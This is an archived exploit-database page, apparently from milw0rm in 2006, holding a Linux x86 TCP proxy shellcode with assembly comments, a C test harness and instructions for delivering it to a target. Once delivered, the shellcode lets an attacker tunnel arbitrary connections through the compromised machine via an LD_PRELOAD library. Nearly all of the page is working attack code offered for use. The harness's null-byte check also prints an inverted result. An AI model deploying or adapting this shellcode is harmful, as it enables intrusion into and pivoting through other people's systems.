@@ -1,0 +1,232 @@
+<html>
+<head>
+<title>linux/x86 TCP Proxy Shellcode 236 bytes</title>
+<pre>
+// proxylib.c - is located at http://www.milw0rm.com/id.php?id=1476 /str0ke
+
+/********************************************************************
+
+ hey all.. this is my attempt at a very small very functional tcp 
+ proxy shellcode.. to pull this off i ignored the &quot;socks&quot; protocols
+ and invented my own.. sorta..
+
+ how to use me..
+ 
+ deliver shellcode however you would normally deliver shellcode to a
+ machine, lets say 192.168.1.1 in this case..
+ 
+ on your machine you would setup the proxy library like so:
+
+ phar@hatless-cat ~/proxyshell $  gcc -c -o proxyshell_connect.o proxylib.c -fpic
+ phar@hatless-cat ~/proxyshell $  ld -shared -o proxyshell_connect.so proxyshell_connect.o -ldl
+ phar@hatless-cat ~/proxyshell $  export LD_PRELOAD=/full/path/to/proxyshell_connect.so
+ phar@hatless-cat ~/proxyshell $  export SHELLPROXYHOST=192.168.1.16:1280
+
+
+ from now on any calls to connect() will be proxied through the shellcode 
+ which can handle multiple simultanious connections to arbitrary hosts.
+
+ by default the shell binds to port 1280, you can easily modify which 
+ the host binds to by finding the code labeled &quot;port info&quot; like this
+
+        &quot;\xba\xfd\xff\xfa\xff&quot;          // mov    $0xfffafffd,%edx      ;port info
+	
+	invert the last for bytes (logical NOT) and you'll see where port
+	0x5000 is declared.. adjust to whatever port you want, and reinvert..
+
+
+ proxylib.c should be available at stonedcoder.org
+
+ one last note about proxylib.c, it does not handle dns resolution properly, 
+ so ip addresses only.. unless you know.. you feel like making it work..
+
+
+
+ phar[at]stonedcoder[dot]org
+	http://www.stonedcoder.org
+	http://bpp.etherdyne.net
+********************************************************************/
+
+
+
+char shellcode[] = {
+//main:
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\x89\xc3&quot;			// mov    %eax,%ebx
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x40&quot;				// inc    %eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x40&quot;				// inc    %eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\xb0\x66&quot;			// mov    $0x66,%al
+	&quot;\x89\xc7&quot;			// mov    %eax,%edi
+	&quot;\x43&quot;				// inc    %ebx
+	&quot;\xcd\x80&quot;			// int    $0x80			;socket
+
+	&quot;\x89\xc6&quot;			// mov    %eax,%esi
+	&quot;\x89\xf8&quot;			// mov    %edi,%eax
+	&quot;\x31\xd2&quot;			// xor    %edx,%edx
+	&quot;\x52&quot;				// push   %edx
+	&quot;\x52&quot;				// push   %edx
+	&quot;\x52&quot;				// push   %edx
+	&quot;\xba\xfd\xff\xfa\xff&quot; 		// mov    $0xfffafffd,%edx	;port info
+	&quot;\xf7\xd2&quot;			// not    %edx
+	&quot;\x52&quot;				// push   %edx
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\x31\xd2&quot;			// xor    %edx,%edx
+	&quot;\xb2\x10&quot;			// mov    $0x10,%dl
+	&quot;\x52&quot;				// push   %edx
+	&quot;\x51&quot;				// push   %ecx
+	&quot;\x56&quot;				// push   %esi
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\x43&quot;				// inc    %ebx
+	&quot;\xcd\x80&quot;			// int    $0x80			;bind
+
+	&quot;\x53&quot;				// push   %ebx
+	&quot;\x56&quot;				// push   %esi
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\xb0\x66&quot;			// mov    $0x66,%al
+	&quot;\xb3\x04&quot;			// mov    $0x4,%bl
+	&quot;\xcd\x80&quot;			// int    $0x80			;listen
+
+	&quot;\x31\xc9&quot;			// xor    %ecx,%ecx
+	&quot;\x41&quot;				// inc    %ecx
+	&quot;\xb3\x11&quot;			// mov    $0x11,%bl
+	&quot;\xb0\x30&quot;			// mov    $0x30,%al
+	&quot;\xcd\x80&quot;			// int    $0x80			;signal
+
+//do_next_accept:
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x56&quot;				// push   %esi
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\xb0\x66&quot;			// mov    $0x66,%al
+	&quot;\x89\xc2&quot;			// mov    %eax,%edx
+	&quot;\xb3\x05&quot;			// mov    $0x5,%bl
+	&quot;\xcd\x80&quot;			// int    $0x80			;accept
+
+	&quot;\x89\xc7&quot;			// mov    %eax,%edi
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x40&quot;				// inc    %eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x40&quot;				// inc    %eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\xcd\x80&quot;			// int    $0x80			;fork
+
+	&quot;\x85\xc0&quot;			// test   %eax,%eax
+	&quot;\x75\xe2&quot;			// jne    8048398 &lt;do_next_accept&gt;
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\xb0\x66&quot;			// mov    $0x66,%al
+	&quot;\x89\xc3&quot;			// mov    %eax,%ebx
+	&quot;\xb3\x01&quot;			// mov    $0x1,%bl
+	&quot;\xcd\x80&quot;			// int    $0x80			;socket
+
+	&quot;\x89\xc6&quot;			// mov    %eax,%esi
+	&quot;\xb0\x10&quot;			// mov    $0x10,%al
+	&quot;\x29\xc4&quot;			// sub    %eax,%esp
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x52&quot;				// push   %edx
+	&quot;\x51&quot;				// push   %ecx
+	&quot;\x57&quot;				// push   %edi
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\xb0\x66&quot;			// mov    $0x66,%al
+	&quot;\xb3\x0a&quot;			// mov    $0xa,%bl
+	&quot;\xcd\x80&quot;			// int    $0x80			;recv
+
+
+	&quot;\xb0\x66&quot;			// mov    $0x66,%al
+	&quot;\xb3\x03&quot;			// mov    $0x3,%bl
+	&quot;\x89\x34\x24&quot;			// mov    %esi,(%esp)
+	&quot;\xcd\x80&quot;			// int    $0x80
+	&quot;\x85\xc0&quot;			// test   %eax,%eax
+	&quot;\x74\x14&quot;			// jz     ready_to_proxy
+
+//close:
+	&quot;\x89\xf3&quot;			// mov    %esi,%ebx
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\xb0\x06&quot;			// mov    $0x6,%al
+	&quot;\xcd\x80&quot;			// int    $0x80			;close
+
+	&quot;\x87\xf7&quot;			// xchg   %esi,%edi
+	&quot;\x85\xc0&quot;			// test   %eax,%eax
+	&quot;\x74\xf&quot;			// jz     close
+
+//exit:
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\xb0\x01&quot;			// mov    $0x1,%al
+	&quot;\xcd\x80&quot;			// int    $0x80			;recv
+
+//ready_to_proxy:
+	&quot;\x31\xdb&quot;			// xor    %ebx,%ebx
+	&quot;\xb3\x10&quot;			// mov    $0x10,%bl
+	&quot;\x01\xdc&quot;			// add    %ebx,%esp
+	&quot;\x87\xf7&quot;			// xchg   %esi,%edi
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x56&quot;				// push   %esi
+	&quot;\x89\xe3&quot;			// mov    %esp,%ebx
+	&quot;\x31\xc9&quot;			// xor    %ecx,%ecx
+	&quot;\x41&quot;				// inc    %ecx
+	&quot;\x89\xca&quot;			// mov    %ecx,%edx
+	&quot;\xb0\xa8&quot;			// mov    $0xa8,%al
+	&quot;\xcd\x80&quot;			// int    $0x80			;connect
+
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\xb0\x40&quot;			// mov    $0x40,%al
+	&quot;\x89\xe2&quot;			// mov    %esp,%edx
+	&quot;\x50&quot;				// push   %eax
+	&quot;\xb0\x08&quot;			// mov    $0x8,%al
+	&quot;\x50&quot;				// push   %eax
+	&quot;\x52&quot;				// push   %edx
+	&quot;\x56&quot;				// push   %esi
+	&quot;\x89\xe1&quot;			// mov    %esp,%ecx
+	&quot;\x31\xdb&quot;			// xor    %ebx,%ebx
+	&quot;\xb3\x0a&quot;			// mov    $0xa,%bl
+
+//do_next_proxy:,
+	&quot;\x31\xc0&quot;			// xor    %eax,%eax
+	&quot;\xb0\x66&quot;			// mov    $0x66,%al
+	&quot;\xcd\x80&quot;			// int    $0x80			;send/recv
+	&quot;\x85\xc0&quot;			// test   %eax,%eax
+	&quot;\x74\xb9&quot;			// jz     close
+	&quot;\x89\xda&quot;			// mov    %ebx,%edx
+	&quot;\xf6\xc2\x01&quot;			// test   $0x1,%dl
+	&quot;\x75\xc6&quot;			// jnz    ready_to_proxy
+
+//is_recv_call:
+	&quot;\x89\xc2&quot;			// mov    %eax,%edx
+	&quot;\xd1\xe2&quot;			// shl    %edx
+	&quot;\x72\xc0&quot;			// jb     ready_to_proxy
+	&quot;\x89\x41\x08&quot;			// mov    %eax,0x8(%ecx)
+	&quot;\x89\x39&quot;			// mov    %edi,(%ecx)
+	&quot;\x4b&quot;				// dec    %ebx
+	&quot;\xeb\xe1&quot;			// jmp    do_next_proxy
+};
+
+
+int main() {
+int *ret;
+char cnull = 0;
+
+        printf(&quot;shellcode_size: %u\n&quot;, sizeof(shellcode));
+        printf(&quot;contains nulls: &quot;);
+        if(!memmem(shellcode,sizeof(shellcode),&amp;cnull,1)){
+                printf(&quot;yes\n&quot;);
+        }else{
+                printf(&quot;no\n&quot;);
+        }
+
+        ret = (int *)&amp;ret + 2;
+        (*ret) = (int)shellcode;
+
+}
+
+// milw0rm.com [2006-02-07]
+</pre>
+</html>
+
